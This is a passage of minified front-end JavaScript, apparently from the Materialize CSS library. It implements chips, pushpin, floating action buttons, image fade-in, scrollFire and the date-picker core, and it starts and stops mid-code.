                    }, t), s.val(""), s.focus()
                }, s.autocomplete(o.autocompleteOptions))
            }, this.renderChip = function(t) {
                if (t.tag) {
                    var i = e('<div class="chip"></div>');
                    return i.text(t.tag), t.image && i.prepend(e("<img />").attr("src", t.image)), i.append(e('<i class="material-icons close">close</i>')), i
                }
            }, this.setPlaceholder = function(e) {
                void 0 !== e.data("chips") && !e.data("chips").length && o.placeholder ? e.find("input").prop("placeholder", o.placeholder) : (void 0 === e.data("chips") || e.data("chips").length) && o.secondaryPlaceholder && e.find("input").prop("placeholder", o.secondaryPlaceholder)
            }, this.isValid = function(e, t) {
                for (var i = e.data("chips"), n = !1, o = 0; o < i.length; o++)
                    if (i[o].tag === t.tag) return void(n = !0);
                return "" !== t.tag && !n
            }, this.addChip = function(e, t) {
                if (n.isValid(t, e)) {
                    for (var i = n.renderChip(e), o = [], r = t.data("chips"), s = 0; s < r.length; s++) o.push(r[s]);
                    o.push(e), t.data("chips", o), i.insertBefore(t.find("input")), t.trigger("chip.add", e), n.setPlaceholder(t)
                }
            }, this.deleteChip = function(e, t) {
                var i = t.data("chips")[e];
                t.find(".chip").eq(e).remove();
                for (var o = [], r = t.data("chips"), s = 0; s < r.length; s++) s !== e && o.push(r[s]);
                t.data("chips", o), t.trigger("chip.delete", i), n.setPlaceholder(t)
            }, this.selectChip = function(e, t) {
                var i = t.find(".chip").eq(e);
                i && !1 === i.hasClass("selected") && (i.addClass("selected"), t.trigger("chip.select", t.data("chips")[e]))
            }, this.getChipsElement = function(e, t) {
                return t.eq(e)
            }, this.init(), this.handleEvents()
        }
    }(jQuery),
    function(e) {
        e.fn.pushpin = function(t) {
            return "remove" === t ? (this.each((function() {
                (id = e(this).data("pushpin-id")) && (e(window).off("scroll." + id), e(this).removeData("pushpin-id").removeClass("pin-top pinned pin-bottom").removeAttr("style"))
            })), !1) : (t = e.extend({
                top: 0,
                bottom: 1 / 0,
                offset: 0
            }, t), $index = 0, this.each((function() {
                var i = Materialize.guid(),
                    n = e(this),
                    o = e(this).offset().top;

                function r(e) {
                    e.removeClass("pin-top"), e.removeClass("pinned"), e.removeClass("pin-bottom")
                }

                function s(i, n) {
                    i.each((function() {
                        t.top <= n && t.bottom >= n && !e(this).hasClass("pinned") && (r(e(this)), e(this).css("top", t.offset), e(this).addClass("pinned")), n < t.top && !e(this).hasClass("pin-top") && (r(e(this)), e(this).css("top", 0), e(this).addClass("pin-top")), n > t.bottom && !e(this).hasClass("pin-bottom") && (r(e(this)), e(this).addClass("pin-bottom"), e(this).css("top", t.bottom - o))
                    }))
                }
                e(this).data("pushpin-id", i), s(n, e(window).scrollTop()), e(window).on("scroll." + i, (function() {
                    var i = e(window).scrollTop() + t.offset;
                    s(n, i)
                }))
            })))
        }
    }(jQuery),
    function(e) {
        e(document).ready((function() {
            e.fn.reverse = [].reverse, e(document).on("mouseenter.fixedActionBtn", ".fixed-action-btn:not(.click-to-toggle):not(.toolbar)", (function(i) {
                var n = e(this);
                t(n)
            })), e(document).on("mouseleave.fixedActionBtn", ".fixed-action-btn:not(.click-to-toggle):not(.toolbar)", (function(t) {
                var n = e(this);
                i(n)
            })), e(document).on("click.fabClickToggle", ".fixed-action-btn.click-to-toggle > a", (function(n) {
                var o = e(this).parent();
                o.hasClass("active") ? i(o) : t(o)
            })), e(document).on("click.fabToolbar", ".fixed-action-btn.toolbar > a", (function(t) {
                var i = e(this).parent();
                n(i)
            }))
        })), e.fn.extend({
            openFAB: function() {
                t(e(this))
            },
            closeFAB: function() {
                i(e(this))
            },
            openToolbar: function() {
                n(e(this))
            },
            closeToolbar: function() {
                o(e(this))
            }
        });
        var t = function(t) {
                var i = t;
                if (!1 === i.hasClass("active")) {
                    var n, o;
                    !0 === i.hasClass("horizontal") ? o = 40 : n = 40, i.addClass("active"), i.find("ul .btn-floating").velocity({
                        scaleY: ".4",
                        scaleX: ".4",
                        translateY: n + "px",
                        translateX: o + "px"
                    }, {
                        duration: 0
                    });
                    var r = 0;
                    i.find("ul .btn-floating").reverse().each((function() {
                        e(this).velocity({
                            opacity: "1",
                            scaleX: "1",
                            scaleY: "1",
                            translateY: "0",
                            translateX: "0"
                        }, {
                            duration: 80,
                            delay: r
                        }), r += 40
                    }))
                }
            },
            i = function(e) {
                var t, i, n = e;
                !0 === n.hasClass("horizontal") ? i = 40 : t = 40, n.removeClass("active"), n.find("ul .btn-floating").velocity("stop", !0), n.find("ul .btn-floating").velocity({
                    opacity: "0",
                    scaleX: ".4",
                    scaleY: ".4",
                    translateY: t + "px",
                    translateX: i + "px"
                }, {
                    duration: 80
                })
            },
            n = function(t) {
                if ("true" !== t.attr("data-open")) {
                    var i, n, r, s = window.innerWidth,
                        a = window.innerHeight,
                        l = t[0].getBoundingClientRect(),
                        c = t.find("> a").first(),
                        u = t.find("> ul").first(),
                        d = e('<div class="fab-backdrop"></div>'),
                        p = c.css("background-color");
                    c.append(d), i = l.left - s / 2 + l.width / 2, n = a - l.bottom, r = s / d.width(), t.attr("data-origin-bottom", l.bottom), t.attr("data-origin-left", l.left), t.attr("data-origin-width", l.width), t.addClass("active"), t.attr("data-open", !0), t.css({
                        "text-align": "center",
                        width: "100%",
                        bottom: 0,
                        left: 0,
                        transform: "translateX(" + i + "px)",
                        transition: "none"
                    }), c.css({
                        transform: "translateY(" + -n + "px)",
                        transition: "none"
                    }), d.css({
                        "background-color": p
                    }), setTimeout((function() {
                        t.css({
                            transform: "",
                            transition: "transform .2s cubic-bezier(0.550, 0.085, 0.680, 0.530), background-color 0s linear .2s"
                        }), c.css({
                            overflow: "visible",
                            transform: "",
                            transition: "transform .2s"
                        }), setTimeout((function() {
                            t.css({
                                overflow: "hidden",
                                "background-color": p
                            }), d.css({
                                transform: "scale(" + r + ")",
                                transition: "transform .2s cubic-bezier(0.550, 0.055, 0.675, 0.190)"
                            }), u.find("> li > a").css({
                                opacity: 1
                            }), e(window).on("scroll.fabToolbarClose", (function() {
                                o(t), e(window).off("scroll.fabToolbarClose"), e(document).off("click.fabToolbarClose")
                            })), e(document).on("click.fabToolbarClose", (function(i) {
                                e(i.target).closest(u).length || (o(t), e(window).off("scroll.fabToolbarClose"), e(document).off("click.fabToolbarClose"))
                            }))
                        }), 100)
                    }), 0)
                }
            },
            o = function(e) {
                if ("true" === e.attr("data-open")) {
                    var t, i, n = window.innerWidth,
                        o = window.innerHeight,
                        r = e.attr("data-origin-width"),
                        s = e.attr("data-origin-bottom"),
                        a = e.attr("data-origin-left"),
                        l = e.find("> .btn-floating").first(),
                        c = e.find("> ul").first(),
                        u = e.find(".fab-backdrop"),
                        d = l.css("background-color");
                    t = a - n / 2 + r / 2, i = o - s, u.width(), e.removeClass("active"), e.attr("data-open", !1), e.css({
                        "background-color": "transparent",
                        transition: "none"
                    }), l.css({
                        transition: "none"
                    }), u.css({
                        transform: "scale(0)",
                        "background-color": d
                    }), c.find("> li > a").css({
                        opacity: ""
                    }), setTimeout((function() {
                        u.remove(), e.css({
                            "text-align": "",
                            width: "",
                            bottom: "",
                            left: "",
                            overflow: "",
                            "background-color": "",
                            transform: "translate3d(" + -t + "px,0,0)"
                        }), l.css({
                            overflow: "",
                            transform: "translate3d(0," + i + "px,0)"
                        }), setTimeout((function() {
                            e.css({
                                transform: "translate3d(0,0,0)",
                                transition: "transform .2s"
                            }), l.css({
                                transform: "translate3d(0,0,0)",
                                transition: "transform .2s cubic-bezier(0.550, 0.055, 0.675, 0.190)"
                            })
                        }), 20)
                    }), 200)
                }
            }
    }(jQuery),
    function(e) {
        Materialize.fadeInImage = function(t) {
            var i;
            if ("string" == typeof t) i = e(t);
            else {
                if ("object" != typeof t) return;
                i = t
            }
            i.css({
                opacity: 0
            }), e(i).velocity({
                opacity: 1
            }, {
                duration: 650,
                queue: !1,
                easing: "easeOutSine"
            }), e(i).velocity({
                opacity: 1
            }, {
                duration: 1300,
                queue: !1,
                easing: "swing",
                step: function(t, i) {
                    i.start = 100;
                    var n = t / 100,
                        o = 150 - (100 - t) / 1.75;
                    o < 100 && (o = 100), t >= 0 && e(this).css({
                        "-webkit-filter": "grayscale(" + n + ")brightness(" + o + "%)",
                        filter: "grayscale(" + n + ")brightness(" + o + "%)"
                    })
                }
            })
        }, Materialize.showStaggeredList = function(t) {
            var i;
            if ("string" == typeof t) i = e(t);
            else {
                if ("object" != typeof t) return;
                i = t
            }
            var n = 0;
            i.find("li").velocity({
                translateX: "-100px"
            }, {
                duration: 0
            }), i.find("li").each((function() {
                e(this).velocity({
                    opacity: "1",
                    translateX: "0"
                }, {
                    duration: 800,
                    delay: n,
                    easing: [60, 10]
                }), n += 120
            }))
        }, e(document).ready((function() {
            var t = !1,
                i = !1;
            e(".dismissable").each((function() {
                e(this).hammer({
                    prevent_default: !1
                }).on("pan", (function(n) {
                    if ("touch" === n.gesture.pointerType) {
                        var o = e(this),
                            r = n.gesture.direction,
                            s = n.gesture.deltaX,
                            a = n.gesture.velocityX;
                        o.velocity({
                            translateX: s
                        }, {
                            duration: 50,
                            queue: !1,
                            easing: "easeOutQuad"
                        }), 4 === r && (s > o.innerWidth() / 2 || a < -.75) && (t = !0), 2 === r && (s < -1 * o.innerWidth() / 2 || a > .75) && (i = !0)
                    }
                })).on("panend", (function(n) {
                    if (Math.abs(n.gesture.deltaX) < e(this).innerWidth() / 2 && (i = !1, t = !1), "touch" === n.gesture.pointerType) {
                        var o, r = e(this);
                        t || i ? (o = t ? r.innerWidth() : -1 * r.innerWidth(), r.velocity({
                            translateX: o
                        }, {
                            duration: 100,
                            queue: !1,
                            easing: "easeOutQuad",
                            complete: function() {
                                r.css("border", "none"), r.velocity({
                                    height: 0,
                                    padding: 0
                                }, {
                                    duration: 200,
                                    queue: !1,
                                    easing: "easeOutQuad",
                                    complete: function() {
                                        r.remove()
                                    }
                                })
                            }
                        })) : r.velocity({
                            translateX: 0
                        }, {
                            duration: 100,
                            queue: !1,
                            easing: "easeOutQuad"
                        }), t = !1, i = !1
                    }
                }))
            }))
        }))
    }(jQuery),
    function(e) {
        var t = !1;
        Materialize.scrollFire = function(e) {
            var i = Materialize.throttle((function() {
                ! function() {
                    for (var t = window.pageYOffset + window.innerHeight, i = 0; i < e.length; i++) {
                        var n = e[i],
                            o = n.selector,
                            r = n.offset,
                            s = n.callback,
                            a = document.querySelector(o);
                        null !== a && t > a.getBoundingClientRect().top + window.pageYOffset + r && !0 !== n.done && ("function" == typeof s ? s.call(this, a) : "string" == typeof s && new Function(s)(a), n.done = !0)
                    }
                }()
            }), e.throttle || 100);
            t || (window.addEventListener("scroll", i), window.addEventListener("resize", i), t = !0), setTimeout(i, 0)
        }
    }(jQuery), Materialize.Picker = function(e) {
        var t = e(window),
            i = e(document),
            n = e(document.documentElement);

        function o(t, l, c, d) {
            if (!t) return o;
            var p = !1,
                f = {
                    id: t.id || "P" + Math.abs(~~(Math.random() * new Date))
                },
                h = c ? e.extend(!0, {}, c.defaults, d) : d || {},
                v = e.extend({}, o.klasses(), h.klass),
                g = e(t),
                m = function() {
                    return this.start()
                },
                y = m.prototype = {
                    constructor: m,
                    $node: g,
                    start: function() {
                        return f && f.start ? y : (f.methods = {}, f.start = !0, f.open = !1, f.type = t.type, t.autofocus = t == u(), t.readOnly = !h.editable, t.id = t.id || f.id, "text" != t.type && (t.type = "text"), y.component = new c(y, h), y.$root = e(o._.node("div", b(), v.picker, 'id="' + t.id + '_root" tabindex="0"')), function x() {
                            y.$root.on({
                                keydown: C,
                                focusin: function(e) {
                                    y.$root.removeClass(v.focused), e.stopPropagation()
                                },
                                "mousedown click": function(t) {
                                    var i = t.target;
                                    i != y.$root.children()[0] && (t.stopPropagation(), "mousedown" != t.type || e(i).is("input, select, textarea, button, option") || (t.preventDefault(), y.$root.eq(0).focus()))
                                }
                            }).on({
                                focus: function() {
                                    g.addClass(v.target)
                                },
                                blur: function() {
                                    g.removeClass(v.target)
                                }
                            }).on("focus.toOpen", T).on("click", "[data-pick], [data-nav], [data-clear], [data-close]", (function() {
                                var t = e(this),
                                    i = t.data(),
                                    n = t.hasClass(v.navDisabled) || t.hasClass(v.disabled),
                                    o = u();
                                o = o && (o.type || o.href) && o, (n || o && !e.contains(y.$root[0], o)) && y.$root.eq(0).focus(), !n && i.nav ? y.set("highlight", y.component.item.highlight, {
                                    nav: i.nav
                                }) : !n && "pick" in i ? (y.set("select", i.pick), h.closeOnSelect && y.close(!0)) : i.clear ? (y.clear(), h.closeOnSelect && y.close(!0)) : i.close && y.close(!0)
                            })), a(y.$root[0], "hidden", !0)
                        }(), h.formatSubmit && function k() {
                            var i;
                            !0 === h.hiddenName ? (i = t.name, t.name = "") : i = (i = ["string" == typeof h.hiddenPrefix ? h.hiddenPrefix : "", "string" == typeof h.hiddenSuffix ? h.hiddenSuffix : "_submit"])[0] + t.name + i[1], y._hidden = e('<input type=hidden name="' + i + '"' + (g.data("value") || t.value ? ' value="' + y.get("select", h.formatSubmit) + '"' : "") + ">")[0], g.on("change." + f.id, (function() {
                                y._hidden.value = t.value ? y.get("select", h.formatSubmit) : ""
                            })), h.container ? e(h.container).append(y._hidden) : g.before(y._hidden)
                        }(), function w() {
                            g.data(l, y).addClass(v.input).attr("tabindex", -1).val(g.data("value") ? y.get("select", h.format) : t.value), h.editable || g.on("focus." + f.id + " click." + f.id, (function(e) {
                                e.preventDefault(), y.$root.eq(0).focus()
                            })).on("keydown." + f.id, C), a(t, {
                                haspopup: !0,
                                expanded: !1,
                                readonly: !1,
                                owns: t.id + "_root"
                            })
                        }(), h.container ? e(h.container).append(y.$root) : g.before(y.$root), y.on({
                            start: y.component.onStart,
                            render: y.component.onRender,
                            stop: y.component.onStop,
                            open: y.component.onOpen,
                            close: y.component.onClose,
                            set: y.component.onSet
                        }).on({
                            start: h.onStart,
                            render: h.onRender,
                            stop: h.onStop,
                            open: h.onOpen,
                            close: h.onClose,
                            set: h.onSet
                        }), p = function r(e) {
                            var t, i = "position";
                            return e.currentStyle ? t = e.currentStyle[i] : window.getComputedStyle && (t = getComputedStyle(e)[i]), "fixed" == t
                        }(y.$root.children()[0]), t.autofocus && y.open(), y.trigger("start").trigger("render"))
                    },
                    render: function(e) {
                        return e ? y.$root.html(b()) : y.$root.find("." + v.box).html(y.component.nodes(f.open)), y.trigger("render")
                    },
                    stop: function() {
                        return f.start ? (y.close(), y._hidden && y._hidden.parentNode.removeChild(y._hidden), y.$root.remove(), g.removeClass(v.input).removeData(l), setTimeout((function() {
                            g.off("." + f.id)
                        }), 0), t.type = f.type, t.readOnly = !1, y.trigger("stop"), f.methods = {}, f.start = !1, y) : y
                    },
                    open: function(r) {
                        return f.open ? y : (g.addClass(v.active), a(t, "expanded", !0), setTimeout((function() {
                            y.$root.addClass(v.opened), a(y.$root[0], "hidden", !1)
                        }), 0), !1 !== r && (f.open = !0, p && n.css("overflow", "hidden").css("padding-right", "+=" + s()), y.$root.eq(0).focus(), i.on("click." + f.id + " focusin." + f.id, (function(e) {
                            var i = e.target;
                            i != t && i != document && 3 != e.which && y.close(i === y.$root.children()[0])
                        })).on("keydown." + f.id, (function(t) {
                            var i = t.keyCode,
                                n = y.component.key[i],
                                r = t.target;
                            27 == i ? y.close(!0) : r != y.$root[0] || !n && 13 != i ? e.contains(y.$root[0], r) && 13 == i && (t.preventDefault(), r.click()) : (t.preventDefault(), n ? o._.trigger(y.component.key.go, y, [o._.trigger(n)]) : y.$root.find("." + v.highlighted).hasClass(v.disabled) || (y.set("select", y.component.item.highlight), h.closeOnSelect && y.close(!0)))
                        }))), y.trigger("open"))
                    },
                    close: function(e) {
                        return e && (y.$root.off("focus.toOpen").eq(0).focus(), setTimeout((function() {
                            y.$root.on("focus.toOpen", T)
                        }), 0)), g.removeClass(v.active), a(t, "expanded", !1), setTimeout((function() {
                            y.$root.removeClass(v.opened + " " + v.focused), a(y.$root[0], "hidden", !0)
                        }), 0), f.open ? (f.open = !1, p && n.css("overflow", "").css("padding-right", "-=" + s()), i.off("." + f.id), y.trigger("close")) : y
                    },
                    clear: function(e) {
                        return y.set("clear", null, e)
                    },
                    set: function(t, i, n) {
                        var o, r, s = e.isPlainObject(t),
                            a = s ? t : {};
                        if (n = s && e.isPlainObject(i) ? i : n || {}, t) {
                            for (o in s || (a[t] = i), a) r = a[o], o in y.component.item && (void 0 === r && (r = null), y.component.set(o, r, n)), "select" != o && "clear" != o || g.val("clear" == o ? "" : y.get(o, h.format)).trigger("change");
                            y.render()
                        }
                        return n.muted ? y : y.trigger("set", a)
                    },
                    get: function(e, i) {
                        if (null != f[e = e || "value"]) return f[e];
                        if ("valueSubmit" == e) {
                            if (y._hidden) return y._hidden.value;
                            e = "value"
                        }
                        if ("value" == e) return t.value;
                        if (e in y.component.item) {
                            if ("string" == typeof i) {
                                var n = y.component.get(e);
                                return n ? o._.trigger(y.component.formats.toString, y.component, [i, n]) : ""
                            }
                            return y.component.get(e)
                        }
                    },
                    on: function(t, i, n) {
                        var o, r, s = e.isPlainObject(t),
                            a = s ? t : {};
                        if (t)
                            for (o in s || (a[t] = i), a) r = a[o], n && (o = "_" + o), f.methods[o] = f.methods[o] || [], f.methods[o].push(r);
                        return y
                    },
                    off: function() {
                        var e, t, i = arguments;
                        for (e = 0, namesCount = i.length; e < namesCount; e += 1)(t = i[e]) in f.methods && delete f.methods[t];
                        return y
                    },
                    trigger: function(e, t) {
                        var i = function(e) {
                            var i = f.methods[e];
                            i && i.map((function(e) {
                                o._.trigger(e, y, [t])
                            }))
                        };
                        return i("_" + e), i(e), y
                    }
                };

            function b() {
                return o._.node("div", o._.node("div", o._.node("div", o._.node("div", y.component.nodes(f.open), v.box), v.wrap), v.frame), v.holder)
            }

            function C(e) {
                var t = e.keyCode,
                    i = /^(8|46)$/.test(t);
                if (27 == t) return y.close(), !1;
                (32 == t || i || !f.open && y.component.key[t]) && (e.preventDefault(), e.stopPropagation(), i ? y.clear().close() : y.open())
            }

            function T(e) {
                e.stopPropagation(), "focus" == e.type && y.$root.addClass(v.focused), y.open()
            }
            return new m
        }

        function s() {
            if (n.height() <= t.height()) return 0;
            var i = e('<div style="visibility:hidden;width:100px" />').appendTo("body"),
                o = i[0].offsetWidth;
            i.css("overflow", "scroll");
            var r = e('<div style="width:100%" />').appendTo(i)[0].offsetWidth;
            return i.remove(), o - r
        }

        function a(t, i, n) {
            if (e.isPlainObject(i))
                for (var o in i) l(t, o, i[o]);
            else l(t, i, n)
        }

        function l(e, t, i) {
            e.setAttribute(("role" == t ? "" : "aria-") + t, i)
        }

        function u() {
            try {
                return document.activeElement
            } catch (e) {}
        }
        return o.klasses = function(e) {
            return {
                picker: e = e || "picker",
                opened: e + "--opened",
                focused: e + "--focused",
                input: e + "__input",
                active: e + "__input--active",
                target: e + "__input--target",
                holder: e + "__holder",
                frame: e + "__frame",
                wrap: e + "__wrap",
                box: e + "__box"
            }
        }, o._ = {
            group: function(e) {
                for (var t, i = "", n = o._.trigger(e.min, e); n <= o._.trigger(e.max, e, [n]); n += e.i) t = o._.trigger(e.item, e, [n]), i += o._.node(e.node, t[0], t[1], t[2]);
                return i
            },
            node: function(t, i, n, o) {
                return i ? "<" + t + (n = n ? ' class="' + n + '"' : "") + (o = o ? " " + o : "") + ">" + (i = e.isArray(i) ? i.join("") : i) + "</" + t + ">" : ""
            },
            lead: function(e) {
                return (e < 10 ? "0" : "") + e
            },
            trigger: function(e, t, i) {
                return "function" == typeof e ? e.apply(t, i || []) : e
            },
            digits: function(e) {
                return /\d/.test(e[1]) ? 2 : 1
            },
            isDate: function(e) {
                return {}.toString.call(e).indexOf("Date") > -1 && this.isInteger(e.getDate())
            },
            isInteger: function(e) {
                return {}.toString.call(e).indexOf("Number") > -1 && e % 1 == 0
            },
            ariaAttr: function c(t, i) {
                for (var n in e.isPlainObject(t) || (t = {
                        attribute: i
                    }), i = "", t) {
                    var o = ("role" == n ? "" : "aria-") + n;
                    i += null == t[n] ? "" : o + '="' + t[n] + '"'
                }
                return i
            }
        }, o.extend = function(t, i) {
            e.fn[t] = function(n, r) {
                var s = this.data(t);
                return "picker" == n ? s : s && "string" == typeof n ? o._.trigger(s[n], s, [r]) : this.each((function() {
                    e(this).data(t) || new o(this, t, i, n)
                }))
            }, e.fn[t].defaults = i.defaults
        }, o
    }(jQuery),
    function(e, t) {
        var i, r = e._;

        function s(e, t) {
            var i, n = this,
                o = e.$node[0],
                r = o.value,
                s = e.$node.data("value"),
                a = s || r,
                l = s ? t.formatSubmit : t.format,
                c = function() {
                    return o.currentStyle ? "rtl" == o.currentStyle.direction : "rtl" == getComputedStyle(e.$root[0]).direction
                };
            n.settings = t, n.$node = e.$node, n.queue = {
                min: "measure create",
                max: "measure create",
                now: "now create",
                select: "parse create validate",
                highlight: "parse navigate create validate",
                view: "parse create validate viewset",
                disable: "deactivate",
                enable: "activate"
            }, n.item = {}, n.item.clear = null, n.item.disable = (t.disable || []).slice(0), n.item.enable = -(!0 === (i = n.item.disable)[0] ? i.shift() : -1), n.set("min", t.min).set("max", t.max).set("now"), a ? n.set("select", a, {
                format: l
            }) : n.set("select", null).set("highlight", n.item.now), n.key = {
                40: 7,
                38: -7,
                39: function() {
                    return c() ? -1 : 1
                },
                37: function() {
                    return c() ? 1 : -1
                },
                go: function(e) {
                    var t = n.item.highlight,
                        i = new Date(t.year, t.month, t.date + e);
                    n.set("highlight", i, {
                        interval: e
                    }), this.render()
                }
            }, e.on("render", (function() {
                e.$root.find("." + t.klass.selectMonth).on("change", (function() {
                    var i = this.value;
                    i && (e.set("highlight", [e.get("view").year, i, e.get("highlight").date]), e.$root.find("." + t.klass.selectMonth).trigger("focus"))
                })), e.$root.find("." + t.klass.selectYear).on("change", (function() {
                    var i = this.value;
                    i && (e.set("highlight", [i, e.get("view").month, e.get("highlight").date]), e.$root.find("." + t.klass.selectYear).trigger("focus"))
                }))
            }), 1).on("open", (function() {
                var i = "";
                n.disabled(n.get("now")) && (i = ":not(." + t.klass.buttonToday + ")"), e.$root.find("button" + i + ", select").attr("disabled", !1)
            }), 1).on("close", (function() {
                e.$root.find("button, select").attr("disabled", !0)
            }), 1)
        }
        s.prototype.set = function(e, t, i) {
            var n = this,
                o = n.item;
            return null === t ? ("clear" == e && (e = "select"), o[e] = t, n) : (o["enable" == e ? "disable" : "flip" == e ? "enable" : e] = n.queue[e].split(" ").map((function(o) {
                return t = n[o](e, t, i)
            })).pop(), "select" == e ? n.set("highlight", o.select, i) : "highlight" == e ? n.set("view", o.highlight, i) : e.match(/^(flip|min|max|disable|enable)$/) && (o.select && n.disabled(o.select) && n.set("select", o.select, i), o.highlight && n.disabled(o.highlight) && n.set("highlight", o.highlight, i)), n)
        }, s.prototype.get = function(e) {
            return this.item[e]
        }, s.prototype.create = function(e, i, n) {
            var o, s = this;
            return (i = void 0 === i ? e : i) == -1 / 0 || i == 1 / 0 ? o = i : t.isPlainObject(i) && r.isInteger(i.pick) ? i = i.obj : t.isArray(i) ? (i = new Date(i[0], i[1], i[2]), i = r.isDate(i) ? i : s.create().obj) : i = r.isInteger(i) || r.isDate(i) ? s.normalize(new Date(i), n) : s.now(e, i, n), {
                year: o || i.getFullYear(),
                month: o || i.getMonth(),
                date: o || i.getDate(),
                day: o || i.getDay(),
                obj: o || i,
                pick: o || i.getTime()
            }
        }, s.prototype.createRange = function(e, i) {
            var n = this,
                o = function(e) {
                    return !0 === e || t.isArray(e) || r.isDate(e) ? n.create(e) : e
                };
            return r.isInteger(e) || (e = o(e)), r.isInteger(i) || (i = o(i)), r.isInteger(e) && t.isPlainObject(i) ? e = [i.year, i.month, i.date + e] : r.isInteger(i) && t.isPlainObject(e) && (i = [e.year, e.month, e.date + i]), {
                from: o(e),
                to: o(i)
            }
        }, s.prototype.withinRange = function(e, t) {
            return e = this.createRange(e.from, e.to), t.pick >= e.from.pick && t.pick <= e.to.pick
        }, s.prototype.overlapRanges = function(e, t) {
            var i = this;
            return e = i.createRange(e.from, e.to), t = i.createRange(t.from, t.to), i.withinRange(e, t.from) || i.withinRange(e, t.to) || i.withinRange(t, e.from) || i.withinRange(t, e.to)
        }, s.prototype.now = function(e, t, i) {
            return t = new Date, i && i.rel && t.setDate(t.getDate() + i.rel), this.normalize(t, i)
        }, s.prototype.navigate = function(e, i, n) {
            var o, r, s, a, l = t.isArray(i),
                c = t.isPlainObject(i),
                u = this.item.view;
            if (l || c) {
                for (c ? (r = i.year, s = i.month, a = i.date) : (r = +i[0], s = +i[1], a = +i[2]), n && n.nav && u && u.month !== s && (r = u.year, s = u.month), r = (o = new Date(r, s + (n && n.nav ? n.nav : 0), 1)).getFullYear(), s = o.getMonth(); new Date(r, s, a).getMonth() !== s;) a -= 1;
                i = [r, s, a]
            }
            return i
        }, s.prototype.normalize = function(e) {
            return e.setHours(0, 0, 0, 0), e
        }, s.prototype.measure = function(e, t) {
            return t ? "string" == typeof t ? t = this.parse(e, t) : r.isInteger(t) && (t = this.now(e, t, {
                rel: t
            })) : t = "min" == e ? -1 / 0 : 1 / 0, t
        }, s.prototype.viewset = function(e, t) {
            return this.create([t.year, t.month, 1])
        }, s.prototype.validate = function(e, i, n) {
            var o, s, a, l, c = this,
                u = i,
                d = n && n.interval ? n.interval : 1,
                p = -1 === c.item.enable,
                f = c.item.min,
                h = c.item.max,
                v = p && c.item.disable.filter((function(e) {
                    if (t.isArray(e)) {
                        var n = c.create(e).pick;
                        n < i.pick ? o = !0 : n > i.pick && (s = !0)
                    }
                    return r.isInteger(e)
                })).length;
            if ((!n || !n.nav) && (!p && c.disabled(i) || p && c.disabled(i) && (v || o || s) || !p && (i.pick <= f.pick || i.pick >= h.pick)))
                for (p && !v && (!s && d > 0 || !o && d < 0) && (d *= -1); c.disabled(i) && (Math.abs(d) > 1 && (i.month < u.month || i.month > u.month) && (i = u, d = d > 0 ? 1 : -1), i.pick <= f.pick ? (a = !0, d = 1, i = c.create([f.year, f.month, f.date + (i.pick === f.pick ? 0 : -1)])) : i.pick >= h.pick && (l = !0, d = -1, i = c.create([h.year, h.month, h.date + (i.pick === h.pick ? 0 : 1)])), !a || !l);) i = c.create([i.year, i.month, i.date + d]);
            return i
        }, s.prototype.disabled = function(e) {
            var i = this,
                n = i.item.disable.filter((function(n) {
                    return r.isInteger(n) ? e.day === (i.settings.firstDay ? n : n - 1) % 7 : t.isArray(n) || r.isDate(n) ? e.pick === i.create(n).pick : t.isPlainObject(n) ? i.withinRange(n, e) : void 0
                }));
            return n = n.length && !n.filter((function(e) {
                return t.isArray(e) && "inverted" == e[3] || t.isPlainObject(e) && e.inverted
            })).length, -1 === i.item.enable ? !n : n || e.pick < i.item.min.pick || e.pick > i.item.max.pick
        }, s.prototype.parse = function(e, t, i) {
            var n = this,
                o = {};
            return t && "string" == typeof t ? (i && i.format || ((i = i || {}).format = n.settings.format), n.formats.toArray(i.format).map((function(e) {
                var i = n.formats[e],
                    s = i ? r.trigger(i, n, [t, o]) : e.replace(/^!/, "").length;
                i && (o[e] = t.substr(0, s)), t = t.substr(s)
            })), [o.yyyy || o.yy, +(o.mm || o.m) - 1, o.dd || o.d]) : t
        }, s.prototype.formats = function() {
            function e(e, t, i) {
                var n = e.match(/\w+/)[0];
                return i.mm || i.m || (i.m = t.indexOf(n) + 1), n.length
            }

            function t(e) {
                return e.match(/\w+/)[0].length
            }
            return {
                d: function(e, t) {
                    return e ? r.digits(e) : t.date
                },
                dd: function(e, t) {
                    return e ? 2 : r.lead(t.date)
                },
                ddd: function(e, i) {
                    return e ? t(e) : this.settings.weekdaysShort[i.day]
                },
                dddd: function(e, i) {
                    return e ? t(e) : this.settings.weekdaysFull[i.day]
                },
                m: function(e, t) {
                    return e ? r.digits(e) : t.month + 1
                },
                mm: function(e, t) {
                    return e ? 2 : r.lead(t.month + 1)
                },
                mmm: function(t, i) {
                    var n = this.settings.monthsShort;
                    return t ? e(t, n, i) : n[i.month]
                },
                mmmm: function(t, i) {
                    var n = this.settings.monthsFull;
                    return t ? e(t, n, i) : n[i.month]
                },
                yy: function(e, t) {
                    return e ? 2 : ("" + t.year).slice(2)
                },
                yyyy: function(e, t) {
                    return e ? 4 : t.year
                },
                toArray: function(e) {
                    return e.split(/(d{1,4}|m{1,4}|y{4}|yy|!.)/g)
                },
                toString: function(e, t) {
                    var i = this;
                    return i.formats.toArray(e).map((function(e) {
                        return r.trigger(i.formats[e], i, [0, t]) || e.replace(/^!/, "")
                    })).join("")
                }
            }
        }(), s.prototype.isDateExact = function(e, i) {
            var n = this;
            return r.isInteger(e) && r.isInteger(i) || "boolean" == typeof e && "boolean" == typeof i ? e === i : (r.isDate(e) || t.isArray(e)) && (r.isDate(i) || t.isArray(i)) ? n.create(e).pick === n.create(i).pick : !(!t.isPlainObject(e) || !t.isPlainObject(i)) && n.isDateExact(e.from, i.from) && n.isDateExact(e.to, i.to)
        }, s.prototype.isDateOverlap = function(e, i) {
            var n = this,
                o = n.settings.firstDay ? 1 : 0;
            return r.isInteger(e) && (r.isDate(i) || t.isArray(i)) ? (e = e % 7 + o) === n.create(i).day + 1 : r.isInteger(i) && (r.isDate(e) || t.isArray(e)) ? (i = i % 7 + o) === n.create(e).day + 1 : !(!t.isPlainObject(e) || !t.isPlainObject(i)) && n.overlapRanges(e, i)
        }, s.prototype.flipEnable = function(e) {
            var t = this.item;
            t.enable = e || (-1 == t.enable ? 1 : -1)
        }, s.prototype.deactivate = function(e, i) {
            var n = this,
                o = n.item.disable.slice(0);
            return "flip" == i ? n.flipEnable() : !1 === i ? (n.flipEnable(1), o = []) : !0 === i ? (n.flipEnable(-1), o = []) : i.map((function(e) {
                for (var i, s = 0; s < o.length; s += 1)
                    if (n.isDateExact(e, o[s])) {
                        i = !0;
                        break
